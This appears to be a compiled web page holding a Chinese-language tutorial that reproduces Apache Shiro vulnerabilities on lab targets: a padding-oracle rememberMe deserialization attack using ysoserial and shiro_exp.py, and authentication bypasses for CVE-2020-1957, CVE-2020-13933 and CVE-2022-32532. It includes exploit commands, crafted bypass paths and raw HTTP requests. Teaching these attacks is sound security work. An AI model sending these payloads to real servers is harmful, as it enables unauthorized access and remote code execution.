Oracle\u52a0\u5bc6\u751f\u6210\u7684\u653b\u51fb\u4ee3\u7801\u6765\u6784\u9020\u6076\u610f\u7684rememberMe\u5b57\u6bb5\uff0c\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u653b\u51fb\uff0c\u9700\u8981\u6267\u884c\u7684\u547d\u4ee4\u8d8a\u590d\u6742\uff0c\u751f\u6210payload\u9700\u8981\u7684\u65f6\u95f4\u5c31\u8d8a\u957f\u3002"),(0,n.kt)("h3",{id:"\u6f0f\u6d1e\u539f\u7406-1"},"\u6f0f\u6d1e\u539f\u7406"),(0,n.kt)("p",null,"\u7531\u4e8eApache Shiro cookie\u4e2d\u901a\u8fc7 AES-128-CBC \u6a21\u5f0f\u52a0\u5bc6\u7684rememberMe\u5b57\u6bb5\u5b58\u5728\u95ee\u9898\uff0c\u7528\u6237\u53ef\u901a\u8fc7Padding Oracle \u52a0\u5bc6\u751f\u6210\u7684\u653b\u51fb\u4ee3\u7801\u6765\u6784\u9020\u6076\u610f\u7684rememberMe\u5b57\u6bb5\uff0c\u7528\u6709\u6548\u7684RememberMe cookie\u4f5c\u4e3aPadding Oracle Attack \u7684\u524d\u7f00\uff0c\u7136\u540e\u5236\u4f5c\u7cbe\u5fc3\u5236\u4f5c\u7684RememberMe\u6765\u6267\u884cJava\u53cd\u5e8f\u5217\u5316\u653b\u51fb"),(0,n.kt)("h3",{id:"\u653b\u51fb\u6d41\u7a0b"},"\u653b\u51fb\u6d41\u7a0b"),(0,n.kt)("p",null,"\u767b\u5f55\u7f51\u7ad9\uff0c\u5e76\u4ececookie\u4e2d\u83b7\u53d6RememberMe\u3002\u4f7f\u7528RememberMe cookie\u4f5c\u4e3aPadding Oracle Attack\u7684\u524d\u7f00\u3002\u52a0\u5bc6syserial\u7684\u5e8f\u5217\u5316\u6709\u6548\u8d1f\u8f7d\uff0c\u4ee5\u901a\u8fc7Padding Oracle Attack\u5236\u4f5c\u7cbe\u5fc3\u5236\u4f5c\u7684RememberMe\u3002\u8bf7\u6c42\u5e26\u6709\u65b0\u7684RememberMe cookie\u7684\u7f51\u7ad9\uff0c\u4ee5\u6267\u884c\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u3002\u653b\u51fb\u8005\u65e0\u9700\u77e5\u9053RememberMe\u52a0\u5bc6\u7684\u5bc6\u7801\u5bc6\u94a5\u3002"),(0,n.kt)("h3",{id:"aes-128-cbc"},"AES-128-CBC"),(0,n.kt)("p",null,"\u5c5e\u4e8eAES\u52a0\u5bc6\u7b97\u6cd5\u7684CBC\u6a21\u5f0f\uff0c\u4f7f\u7528128\u4f4d\u6570\u636e\u5757\u4e3a\u4e00\u7ec4\u8fdb\u884c\u52a0\u5bc6\u89e3\u5bc6\uff0c\u537316\u5b57\u8282\u660e\u6587\uff0c\u5bf9\u5e9416\u5b57\u8282\u5bc6\u6587\uff0c\uff0c\u660e\u6587\u52a0\u5bc6\u65f6\uff0c\u5982\u679c\u6570\u636e\u4e0d\u591f16\u5b57\u8282\uff0c\u5219\u4f1a\u5c06\u6570\u636e\u8865\u5168\u5269\u4f59\u5b57\u8282"),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},"\u82e5\u6700\u540e\u5269\u4f59\u7684\u660e\u6587\u4e0d\u591f16\u5b57\u8282\uff0c\u9700\u8981\u8fdb\u884c\u586b\u5145\uff0c\u901a\u5e38\u91c7\u7528PKCS7\u8fdb\u884c\u586b\u5145\u3002\u6bd4\u5982\u6700\u540e\u7f3a3\u4e2a\u5b57\u8282\uff0c\u5219\u586b\u51453\u4e2a\u5b57\u8282\u76840x03;\u82e5\u6700\u540e\u7f3a10\u4e2a\u5b57\u8282\uff0c\u5219\u586b\u514510\u4e2a\u5b57\u8282\u76840x0a;"),(0,n.kt)("li",{parentName:"ul"},"\u82e5\u660e\u6587\u6b63\u597d\u662f16\u4e2a\u5b57\u8282\u7684\u6574\u6570\u500d\uff0c\u6700\u540e\u8981\u518d\u52a0\u5165\u4e00\u4e2a16\u5b57\u82820x10\u7684\u7ec4\u518d\u8fdb\u884c\u52a0\u5bc6")),(0,n.kt)("h3",{id:"padding-oracle-attack\u539f\u7406"},"Padding Oracle Attack\u539f\u7406"),(0,n.kt)("p",null,"Padding Oracle\u653b\u51fb\u53ef\u4ee5\u5728\u6ca1\u6709\u5bc6\u94a5\u7684\u60c5\u51b5\u4e0b\u52a0\u5bc6\u6216\u89e3\u5bc6\u5bc6\u6587\nShiro Padding Oracle Attack\uff08Shiro\u586b\u5145Oracle\u653b\u51fb\uff09\u662f\u4e00\u79cd\u9488\u5bf9Apache Shiro\u8eab\u4efd\u9a8c\u8bc1\u6846\u67b6\u7684\u5b89\u5168\u6f0f\u6d1e\u653b\u51fb\u3002Apache Shiro\u662fJava\u5e94\u7528\u7a0b\u5e8f\u4e2d\u5e7f\u6cdb\u4f7f\u7528\u7684\u8eab\u4efd\u9a8c\u8bc1\u548c\u6388\u6743\u6846\u67b6\uff0c\u7528\u4e8e\u7ba1\u7406\u7528\u6237\u4f1a\u8bdd\u3001\u6743\u9650\u9a8c\u8bc1\u7b49\u529f\u80fd\u3002\nPadding Oracle Attack\uff08\u586b\u5145Oracle\u653b\u51fb\uff09\u662f\u4e00\u79cd\u9488\u5bf9\u52a0\u5bc6\u7b97\u6cd5\u4f7f\u7528\u586b\u5145\u7684\u5b89\u5168\u6f0f\u6d1e\u653b\u51fb\u3002\u5728\u52a0\u5bc6\u901a\u4fe1\u4e2d\uff0c\u586b\u5145\u7528\u4e8e\u5c06\u660e\u6587\u6570\u636e\u6269\u5c55\u5230\u52a0\u5bc6\u7b97\u6cd5\u5757\u5927\u5c0f\u7684\u500d\u6570\u3002\u5728\u6b64\u653b\u51fb\u4e2d\uff0c\u653b\u51fb\u8005\u5229\u7528\u586b\u5145\u7684\u54cd\u5e94\u4fe1\u606f\u6765\u63a8\u65ad\u51fa\u52a0\u5bc6\u7b97\u6cd5\u4e2d\u7684\u79d8\u5bc6\u4fe1\u606f\u3002\nShiro Padding Oracle Attack\u5229\u7528\u4e86Shiro\u6846\u67b6\u4e2d\u7684\u8eab\u4efd\u9a8c\u8bc1\u8fc7\u7a0b\u4e2d\u7684\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u5141\u8bb8\u653b\u51fb\u8005\u901a\u8fc7\u586b\u5145\u4fe1\u606f\u7684\u4e0d\u540c\u54cd\u5e94\u65f6\u95f4\u6765\u786e\u5b9a\u8eab\u4efd\u9a8c\u8bc1\u8fc7\u7a0b\u4e2d\u7684\u9519\u8bef\u3002\u901a\u8fc7\u4e0d\u65ad\u5c1d\u8bd5\u4e0d\u540c\u7684\u586b\u5145\u65b9\u5f0f\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u9010\u6b65\u63a8\u65ad\u51fa\u52a0\u5bc6\u79d8\u94a5\uff0c\u5e76\u6700\u7ec8\u83b7\u53d6\u8bbf\u95ee\u6743\u9650\u3002\n\u8fd9\u79cd\u653b\u51fb\u5229\u7528\u4e86\u586b\u5145\u9519\u8bef\u7684\u8eab\u4efd\u9a8c\u8bc1\u54cd\u5e94\u6765\u83b7\u53d6\u5173\u4e8e\u79d8\u5bc6\u4fe1\u606f\u7684\u4fe1\u606f\u6cc4\u6f0f\uff0c\u7136\u540e\u6839\u636e\u8fd9\u4e9b\u4fe1\u606f\u8fdb\u884c\u8fdb\u4e00\u6b65\u7684\u653b\u51fb\u3002\u4e3a\u4e86\u9632\u6b62Shiro Padding Oracle Attack\uff0c\u5efa\u8bae\u53ca\u65f6\u66f4\u65b0Apache Shiro\u7248\u672c\uff0c\u786e\u4fdd\u5df2\u4fee\u590d\u8be5\u6f0f\u6d1e\uff0c\u5e76\u91c7\u53d6\u5176\u4ed6\u5b89\u5168\u63aa\u65bd\uff0c\u5982\u4f7f\u7528\u5b89\u5168\u7684\u52a0\u5bc6\u7b97\u6cd5\u548c\u5bc6\u94a5\u7ba1\u7406\u7b56\u7565\u3002"),(0,n.kt)("h2",{id:"\u6f0f\u6d1e\u590d\u73b0-1"},"\u6f0f\u6d1e\u590d\u73b0"),(0,n.kt)("h3",{id:"1\u62c9\u53d6\u73af\u5883"},"1\u3001\u62c9\u53d6\u73af\u5883"),(0,n.kt)("p",null,(0,n.kt)("img",{parentName:"p",src:"https://cdn.nlark.com/yuque/0/2023/png/5378792/1694525190159-f6b15f3b-4f70-40aa-a2d0-ea3ada9bce8a.png#averageHue=%23090605&clientId=u32eda4fe-00f4-4&from=paste&id=uf8a769f3&originHeight=254&originWidth=580&originalType=url&ratio=1.100000023841858&rotation=0&showTitle=false&status=done&style=none&taskId=uc10685b6-00cd-46f8-815e-71bed2c42c7&title=",alt:null}),"\n\u73af\u5883\u542f\u52a8\u5b8c\u6210\u540e,\u5728\u672c\u5730\u6d4f\u89c8\u5668\u8bbf\u95ee\u9776\u573a\u5730\u5740:your-ip:8080\n",(0,n.kt)("img",{parentName:"p",src:"https://cdn.nlark.com/yuque/0/2023/png/5378792/1694525190346-9298bc3e-e99b-4551-abb2-fe25a39796e6.png#averageHue=%23f7efd5&clientId=u32eda4fe-00f4-4&from=paste&id=u4747fc3e&originHeight=480&originWidth=659&originalType=url&ratio=1.100000023841858&rotation=0&showTitle=false&status=done&style=none&taskId=u10a32ce3-65b4-4898-b95b-6474d8fab64&title=",alt:null})),(0,n.kt)("h3",{id:"2\u653b\u51fb\u73af\u8282"},"2\u3001\u653b\u51fb\u73af\u8282"),(0,n.kt)("p",null,"0x01 \u767b\u5f55\u6210\u529f\u540e\uff0c\u6211\u4eec\u4eceCookie\u4e2d\u83b7\u53d6\u5230rememberMe\u5b57\u6bb5\u7684\u503c\n",(0,n.kt)("img",{parentName:"p",src:"https://cdn.nlark.com/yuque/0/2023/png/5378792/1694525190295-8db1357a-76cc-4007-8422-c53a28c6dfb0.png#averageHue=%23f6f0f0&clientId=u32eda4fe-00f4-4&from=paste&id=u4006dbb5&originHeight=304&originWidth=655&originalType=url&ratio=1.100000023841858&rotation=0&showTitle=false&status=done&style=none&taskId=u688c42a8-b189-4a43-b141-2ca9d9aeb0a&title=",alt:null}),'\n0x02 \u4f7f\u7528ysoserial\u751f\u6210Payload\njava -jar ysoserial.jar CommonsCollections1 "touch /tmp/YikJiang" > payload.class\n',(0,n.kt)("img",{parentName:"p",src:"https://cdn.nlark.com/yuque/0/2023/png/5378792/1694525190461-26b22d93-d0ba-4ff7-83ab-d204e7d6e644.png#averageHue=%23191919&clientId=u32eda4fe-00f4-4&from=paste&id=u809741a8&originHeight=155&originWidth=489&originalType=url&ratio=1.100000023841858&rotation=0&showTitle=false&status=done&style=none&taskId=u1787aad8-d96e-4e0e-8085-fbda304adc6&title=",alt:null}),"\n0x03 \u4f7f\u7528rememberMe\u503c\u4f5c\u4e3aprefix\uff0c\u52a0\u8f7dPayload\uff0c\u8fdb\u884cPadding Oracle\u653b\u51fb\u3002"),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-shell"},"python shiro_exp.py http://47.95.201.15:8080/account/ k+3DDsh6f+macxMUtS2QvAS7Fm3CyMpFB6wz4apvrieZhTIMaLey74RYMgywpM2fFncf3y7cRTU6F73MIJ5ygJ0QqzYlvX2xcmOUCe+uLiH66B0aAcs7vY6Ipimbo8tTX3vbReu0vovnmDVK4fT+lfmhZxtgFp8imCapqIb6KYr3NtmQTfORGhFZ+I2vzMN2geaYRwFkTbzfuo8vHgmzHJaR1jTn2sLVaxiIuqMYqsjiCVvN7q64wpde0JGQs1eowMKJ5VSlnUnp1NGficIFYdTETxDjJJHrmKNSxdHPCstWfQD3N6jEK1CT3vE+UxxVrtSO2XoBEHYrSTdK1bxVtunwVu5+F7lfwex3b2qY/F6EzCUjzKQN13AmqhrnyesRx+AYNzVFCZ49oYfj/dtz1XKbGr9anMuw6dq/avJdMfHzlEUThYFgZ2yRSUBAlOGliwwV+GRuhjRocka3wAgjxyG80VdJiovtXhoEhvd3peYC6TzPi2hPVXppVq3P+F8s payload.class\n")),(0,n.kt)("p",null,(0,n.kt)("img",{parentName:"p",src:"https://cdn.nlark.com/yuque/0/2023/png/5378792/1694525190450-7b37ccca-7616-4f29-8f09-4981abf8bad9.png#averageHue=%23150f0b&clientId=u32eda4fe-00f4-4&from=paste&id=u993de95a&originHeight=479&originWidth=815&originalType=url&ratio=1.100000023841858&rotation=0&showTitle=false&status=done&style=none&taskId=u14970bef-74f5-4e69-b5b9-93464e9901f&title=",alt:null}),"\n\u751f\u6210\u7684payload.class\u5185\u5bb9\u8d8a\u591a\u65f6\u95f4\u5c31\u8d8a\u957f\uff0c\u6240\u4ee5\u5c3d\u91cf\u9009\u62e9\u8f83\u77ed\u7684\u547d\u4ee4\u6267\u884c\u6765\u590d\u73b0\u6f0f\u6d1e\u5373\u53ef\u3002\u6700\u7ec8\u4f1a\u751f\u6210\u5982\u4e0brememberMe cookies\n",(0,n.kt)("img",{parentName:"p",src:"https://cdn.nlark.com/yuque/0/2023/png/5378792/1694525190869-7d05e526-147c-45f4-9eb2-553d6c7d0bdf.png#averageHue=%231d150e&clientId=u32eda4fe-00f4-4&from=paste&id=ud127024c&originHeight=478&originWidth=815&originalType=url&ratio=1.100000023841858&rotation=0&showTitle=false&status=done&style=none&taskId=ubccbcabf-9169-48cf-95fd-9256a4f4535&title=",alt:null}),"\n\u6211\u4eec\u5c06\u8dd1\u51fa\u6765\u7684Cookie\u6dfb\u52a0\u5230\u6570\u636e\u5305\u4e2d\u8fdb\u884c\u53d1\u9001\uff0c\u5c31\u53ef\u4ee5 \u53d1\u73b0\u5728\u9776\u673a\u4e2d\u6210\u679c\u521b\u5efa\u4e86\u5bf9\u5e94\u7684\u6587\u4ef6\u3002\n",(0,n.kt)("img",{parentName:"p",src:"https://cdn.nlark.com/yuque/0/2023/png/5378792/1694525190899-d35b9c2b-7adb-456c-a1ad-19b4d2ac3cb8.png#averageHue=%232d2926&clientId=u32eda4fe-00f4-4&from=paste&id=u93b654f7&originHeight=64&originWidth=496&originalType=url&ratio=1.100000023841858&rotation=0&showTitle=false&status=done&style=none&taskId=u21a8ec83-422d-4782-995a-b1ea1a2c440&title=",alt:null})),(0,n.kt)("p",null,"\u5230\u8fd9\u672a\u77e5\u5176\u5b9e\u7ecf\u5e38\u9047\u5230\u7684Shrio\u6f0f\u6d1e\u5df2\u7ecf\u8868\u8ff0\u7684\u5dee\u4e0d\u591a\u4e86\uff0c\u4e0b\u9762\u51e0\u4e2a\u662fshiro\u5b58\u5728\u4f46\u662f\u5728\u73b0\u5b9e\u4e2d\u5229\u7528\u96be\u5ea6\u5927\u6216\u8005\u662f\u6bd4\u8f83\u5c11\u7684\u6d1e\uff0c\u53ef\u4ee5\u7b80\u5355\u4e86\u89e3\u4e00\u4e0b"),(0,n.kt)("h2",{id:"shiro-\u8ba4\u8bc1\u7ed5\u8fc7\u6f0f\u6d1ecve-2020-1957"},"Shiro \u8ba4\u8bc1\u7ed5\u8fc7\u6f0f\u6d1e\uff08CVE-2020-1957\uff09"),(0,n.kt)("h3",{id:"\u6f0f\u6d1e\u539f\u7406-2"},"\u6f0f\u6d1e\u539f\u7406"),(0,n.kt)("p",null,"\u5728Apache Shiro 1.5.2\u4ee5\u524d\u7684\u7248\u672c\u4e2d\uff0c\u5728\u4f7f\u7528Spring\u52a8\u6001\u63a7\u5236\u5668\u65f6\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u6784\u9020..;\u8fd9\u6837\u7684\u8df3\u8f6c\uff0c\u53ef\u4ee5\u7ed5\u8fc7Shiro\u4e2d\u5bf9\u76ee\u5f55\u7684\u6743\u9650\u9650\u5236\u3002\nURL\u8bf7\u6c42\u8fc7\u7a0b\uff1a"),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},"\u5ba2\u6237\u7aef\u8bf7\u6c42URL: /xxx/..;/admin/"),(0,n.kt)("li",{parentName:"ul"},"Shrio \u5185\u90e8\u5904\u7406\u5f97\u5230\u6821\u9a8cURL\u4e3a /xxxx/..,\u6821\u9a8c\u901a\u8fc7"),(0,n.kt)("li",{parentName:"ul"},"SpringBoot \u5904\u7406 /xxx/..;/admin/ , \u6700\u7ec8\u8bf7\u6c42 /admin/, \u6210\u529f\u8bbf\u95ee\u4e86\u540e\u53f0\u8bf7\u6c42\u3002")),(0,n.kt)("h3",{id:"\u6f0f\u6d1e\u590d\u73b0-2"},"\u6f0f\u6d1e\u590d\u73b0"),(0,n.kt)("h4",{id:"1\u6743\u9650\u914d\u7f6e"},"1\u3001\u6743\u9650\u914d\u7f6e"),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-shell"},' @Bean\n public ShiroFilterChainDefinition shiroFilterChainDefinition() {\n     DefaultShiroFilterChainDefinition chainDefinition = new DefaultShiroFilterChainDefinition();\n     chainDefinition.addPathDefinition("/login.html", "authc"); // need to accept POSTs from the login form\n     chainDefinition.addPathDefinition("/logout", "logout");\n     chainDefinition.addPathDefinition("/admin/**", "authc");\n     return chainDefinition;\n }\n')),(0,n.kt)("h4",{id:"2\u9ed8\u8ba4\u72b6\u6001"},"2\u3001\u9ed8\u8ba4\u72b6\u6001"),(0,n.kt)("p",null,"\u76f4\u63a5\u8bf7\u6c42\u7ba1\u7406\u9875\u9762/admin/\uff0c\u65e0\u6cd5\u8bbf\u95ee\uff0c\u5c06\u4f1a\u88ab\u91cd\u5b9a\u5411\u5230\u767b\u5f55\u9875\u9762\n",(0,n.kt)("img",{parentName:"p",src:"https://cdn.nlark.com/yuque/0/2023/png/5378792/1694525191010-c51d1a67-7b43-43c5-a1ac-e3e757c973f3.png#averageHue=%23f6f4f3&clientId=u32eda4fe-00f4-4&from=paste&id=uc6216f84&originHeight=339&originWidth=913&originalType=url&ratio=1.100000023841858&rotation=0&showTitle=false&status=done&style=none&taskId=uae31f90b-4fb0-4c43-a798-3c828287d9f&title=",alt:null})),(0,n.kt)("h4",{id:"3\u7ed5\u8fc7poc"},"3\u3001\u7ed5\u8fc7POC"),(0,n.kt)("p",null,"\u6784\u9020\u6076\u610f\u8bf7\u6c42/xxx/..;/admin/\uff0c\u5373\u53ef\u7ed5\u8fc7\u6743\u9650\u6821\u9a8c\uff0c\u8bbf\u95ee\u5230\u7ba1\u7406\u9875\u9762\uff1a\n",(0,n.kt)("img",{parentName:"p",src:"https://cdn.nlark.com/yuque/0/2023/png/5378792/1694525191039-f6a0e075-b171-48a9-a72e-c79caca14948.png#averageHue=%23faf9f9&clientId=u32eda4fe-00f4-4&from=paste&id=ub3fd9e46&originHeight=461&originWidth=1036&originalType=url&ratio=1.100000023841858&rotation=0&showTitle=false&status=done&style=none&taskId=ub3aaf5bb-ab3d-43d7-a455-8949e8ec433&title=",alt:null}),"\n",(0,n.kt)("img",{parentName:"p",src:"https://cdn.nlark.com/yuque/0/2023/png/5378792/1694525191447-ee9f740d-d716-4161-9306-83542ab2ca35.png#averageHue=%23cecdcc&clientId=u32eda4fe-00f4-4&from=paste&id=ucee82424&originHeight=260&originWidth=463&originalType=url&ratio=1.100000023841858&rotation=0&showTitle=false&status=done&style=none&taskId=ua6f3378f-a031-4a2a-b317-b17aa2e4a0f&title=",alt:null})),(0,n.kt)("h2",{id:"shiro-\u8eab\u4efd\u9a8c\u8bc1\u7ed5\u8fc7-cve-2020-13933"},"Shiro \u8eab\u4efd\u9a8c\u8bc1\u7ed5\u8fc7 \uff08CVE-2020-13933\uff09"),(0,n.kt)("h3",{id:"\u6f0f\u6d1e\u7b80\u4ecb-2"},"\u6f0f\u6d1e\u7b80\u4ecb"),(0,n.kt)("p",null,"CVE-2020-11989\u7684\u4fee\u590d\u8865\u4e01\u5b58\u5728\u7f3a\u9677\uff0c\u57281.5.3\u53ca\u5176\u4e4b\u524d\u7684\u7248\u672c\uff0c\u7531\u4e8eshiro\u5728\u5904\u7406url\u65f6\u4e0espring\u4ecd\u7136\u5b58\u5728\u5dee\u5f02\uff0c\u4f9d\u7136\u5b58\u5728\u8eab\u4efd\u6821\u9a8c\u7ed5\u8fc7\u6f0f\u6d1e\u7531\u4e8e\u5904\u7406\u8eab\u4efd\u9a8c\u8bc1\u8bf7\u6c42\u65f6\u51fa\u9519\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u53d1\u9001\u7279\u5236\u7684HTTP\u8bf7\u6c42\uff0c\u7ed5\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u8fc7\u7a0b\u5e76\u83b7\u5f97\u5bf9\u5e94\u7528\u7a0b\u5e8f\u7684\u672a\u6388\u6743\u8bbf\u95ee\u3002\n\u8be5\u6f0f\u6d1e\u4ea7\u751f\u7684\u539f\u56e0\u4e3b\u8981\u662fshiro\u5c42\u5728\u5904\u7406url\u4e0a\u548cspring\u4e0a\u5b58\u5728\u5dee\u5f02\uff0c\u4e3b\u8981\u662f\u5728\u5904\u7406;\u4e0a\u7684\u95ee\u9898\uff0c\u901a\u8fc7\u6784\u9020\u542b\u6709;\u7b26\u53f7\u7684url\u5373\u53ef\u7ed5\u8fc7shiro\u5728\u6743\u9650\u4e0a\u7684\u5904\u7406\uff0c\u800cspring\u4e0d\u8d1f\u8d23\u6743\u9650\u7ba1\u63a7\uff0c\u6240\u4ee5\u6700\u7ec8\u4f1a\u5bfc\u81f4\u6743\u9650\u7ed5\u8fc7\u3002ant\u98ce\u683c\u7684\u8def\u5f84\u4ec5\u51fa\u73b0\u4e00\u4e2a",(0,n.kt)("em",{parentName:"p"},"\u65f6\u624d\u80fd\u6210\u529f\uff0c\u800c**\u65e0\u6cd5\u7ed5\u8fc7\uff0c"),"\uff1a\u5339\u914d\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u4efb\u610f\u7684\u5b57\u7b26\u3002\n**\uff1a\u5339\u914d\u96f6\u4e2a\u6216\u8005\u591a\u4e2a\u76ee\u5f55\u3002"),(0,n.kt)("h3",{id:"\u6f0f\u6d1e\u590d\u73b0-3"},"\u6f0f\u6d1e\u590d\u73b0"),(0,n.kt)("h4",{id:"1\u5f00\u542f\u73af\u5883"},"1\u3001\u5f00\u542f\u73af\u5883"),(0,n.kt)("p",null,(0,n.kt)("img",{parentName:"p",src:"https://cdn.nlark.com/yuque/0/2023/png/5378792/1694525191461-6cb08c77-5dc3-45d7-a6d4-20187d43d1c8.png#averageHue=%23fefefe&clientId=u32eda4fe-00f4-4&from=paste&id=u0d307094&originHeight=389&originWidth=523&originalType=url&ratio=1.100000023841858&rotation=0&showTitle=false&status=done&style=none&taskId=u4119d3ca-6fe1-4c86-a08f-bc74f5dbb64&title=",alt:null})),(0,n.kt)("h4",{id:"2\u6b63\u5e38\u8bbf\u95ee\u654f\u611f\u754c\u9762"},"2\u3001\u6b63\u5e38\u8bbf\u95ee\u654f\u611f\u754c\u9762"),(0,n.kt)("p",null,"/admin/admin\n",(0,n.kt)("img",{parentName:"p",src:"https://cdn.nlark.com/yuque/0/2023/png/5378792/1694525191713-490961db-64b0-4202-8a03-52c019004456.png#averageHue=%23c5d9c2&clientId=u32eda4fe-00f4-4&from=paste&id=ufa2dedb0&originHeight=115&originWidth=453&originalType=url&ratio=1.100000023841858&rotation=0&showTitle=false&status=done&style=none&taskId=u9795edfc-a9a9-4440-b0e9-b4709276ad3&title=",alt:null}),"\n\u63d0\u793a\u8ba9\u6211\u4eec\u767b\u5f55"),(0,n.kt)("h4",{id:"3\u901a\u8fc73b\u7ed5\u8fc7\u4e0d\u89e6\u53d1\u8eab\u4efd\u9a8c\u8bc1\u5e76\u4e14\u7ed5\u8fc7\u6743\u9650"},"3\u3001\u901a\u8fc7%3b\u7ed5\u8fc7\uff0c\u4e0d\u89e6\u53d1\u8eab\u4efd\u9a8c\u8bc1\u5e76\u4e14\u7ed5\u8fc7\u6743\u9650"),(0,n.kt)("p",null,"/admin/%3badmin\n",(0,n.kt)("img",{parentName:"p",src:"https://cdn.nlark.com/yuque/0/2023/png/5378792/1694525191876-e5b3bc49-8da7-4096-b8cd-48f22fb116da.png#averageHue=%23c0d5bc&clientId=u32eda4fe-00f4-4&from=paste&id=u64c71b64&originHeight=124&originWidth=551&originalType=url&ratio=1.100000023841858&rotation=0&showTitle=false&status=done&style=none&taskId=ub7976d61-605c-406f-9e0f-d42a898f67e&title=",alt:null})),(0,n.kt)("h2",{id:"shiro-\u6388\u6743\u7ed5\u8fc7-cve-2022-32532"},"Shiro \u6388\u6743\u7ed5\u8fc7 \uff08CVE-2022-32532\uff09"),(0,n.kt)("h3",{id:"\u6f0f\u6d1e\u7b80\u4ecb-3"},"\u6f0f\u6d1e\u7b80\u4ecb"),(0,n.kt)("p",null,"Apache Shiro\u662f\u4e00\u4e2a\u5f3a\u5927\u4e14\u6613\u7528\u7684Java\u5b89\u5168\u6846\u67b6,\u6267\u884c\u8eab\u4efd\u9a8c\u8bc1\u3001\u6388\u6743\u3001\u5bc6\u7801\u548c\u4f1a\u8bdd\u7ba1\u7406\u3002\n1.9.1 \u4e4b\u524d\u7684 Apache Shiro\uff0cRegexRequestMatcher \u53ef\u80fd\u88ab\u9519\u8bef\u914d\u7f6e\u4e3a\u5728\u67d0\u4e9b servlet \u5bb9\u5668\u4e0a\u88ab\u7ed5\u8fc7\u3002\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\u4e2d\u4f7f\u7528\u5e26\u6709 . \u7684 RegExPatternMatcher \u7684\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u5bb9\u6613\u53d7\u5230\u6388\u6743\u7ed5\u8fc7\u3002"),(0,n.kt)("h3",{id:"\u6f0f\u6d1e\u6982\u8ff0"},"\u6f0f\u6d1e\u6982\u8ff0"),(0,n.kt)("p",null,"2022\u5e746\u670829\u65e5\uff0cApache \u5b98\u65b9\u62ab\u9732 Apache Shiro \u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e(CVE-2022-32532)\uff0c\u5f53 Apache Shiro \u4e2d\u4f7f\u7528 RegexRequestMatcher \u8fdb\u884c\u6743\u9650\u914d\u7f6e\uff0c\u4e14\u6b63\u5219\u8868\u8fbe\u5f0f\u4e2d\u643a\u5e26\u201c.\u201d\u65f6\uff0c\u672a\u7ecf\u6388\u6743\u7684\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u6784\u9020\u6076\u610f\u6570\u636e\u5305\u7ed5\u8fc7\u8eab\u4efd\u8ba4\u8bc1\u3002\n%0"),(0,n.kt)("h3",{id:"\u5f71\u54cd\u8303\u56f4"},"\u5f71\u54cd\u8303\u56f4"),(0,n.kt)("p",null,"Apache Shiro < 1.9.1"),(0,n.kt)("h3",{id:"\u5229\u7528\u6d41\u7a0b"},"\u5229\u7528\u6d41\u7a0b"),(0,n.kt)("p",null,"\u8bbf\u95ee\n",(0,n.kt)("img",{parentName:"p",src:"https://cdn.nlark.com/yuque/0/2023/png/5378792/1694525192071-b9a94b84-bf03-4097-aae5-dca6ff0dce7c.png#averageHue=%23f7f6f6&clientId=u32eda4fe-00f4-4&from=paste&id=ud4c570fb&originHeight=312&originWidth=826&originalType=url&ratio=1.100000023841858&rotation=0&showTitle=false&status=done&style=none&taskId=uca74dfaf-b044-424e-a6db-e9a41ad535d&title=",alt:null}),"\n\u6293\u5305\u4fee\u6539"),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-shell"}," GET /permit/any HTTP/1.1\n Host: 123.58.224.8:36930\n Cache-Control: max-age=0\n Upgrade-Insecure-Requests: 1\n User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36\n Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n Accept-Encoding: gzip, deflate\n Accept-Language: zh-CN,zh;q=0.9,en;q=0.8\n Cookie: think_lang=zh-cn\n Connection: close\n")),(0,n.kt)("p",null,(0,n.kt)("img",{parentName:"p",src:"https://cdn.nlark.com/yuque/0/2023/png/5378792/1694525192042-4ca09f7d-03bd-4b60-be77-2fd327d93474.png#averageHue=%23f9f7f7&clientId=u32eda4fe-00f4-4&from=paste&id=u29973744&originHeight=420&originWidth=1104&originalType=url&ratio=1.100000023841858&rotation=0&showTitle=false&status=done&style=none&taskId=u2cbcca69-c486-4b15-84d5-daa2f245ecf&title=",alt:null}),"\n\u9700\u8981\u643a\u5e26token\u5b57\u6bb5\n",(0,n.kt)("img",{parentName:"p",src:"https://cdn.nlark.com/yuque/0/2023/png/5378792/1694525192146-8625cd9d-8070-453f-b405-289ebc63a46a.png#averageHue=%23f9f7f6&clientId=u32eda4fe-00f4-4&from=paste&id=u5a4d12e4&originHeight=352&originWidth=1174&originalType=url&ratio=1.100000023841858&rotation=0&showTitle=false&status=done&style=none&taskId=udc343177-baae-4adf-aee3-585b2ebaff1&title=",alt:null}),"\n\u6539\u5305\u7ed5\u8fc7"),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-shell"}," GET /permit/%0any HTTP/1.1\n Host: 123.58.224.8:36930\n Cache-Control: max-age=0\n Upgrade-Insecure-Requests: 1\n User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36\n Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n Accept-Encoding: gzip, deflate\n Accept-Language: zh-CN,zh;q=0.9,en;q=0.8\n Cookie: think_lang=zh-cn\n Connection: close\n")))}s.isMDXComponent=!0}}]);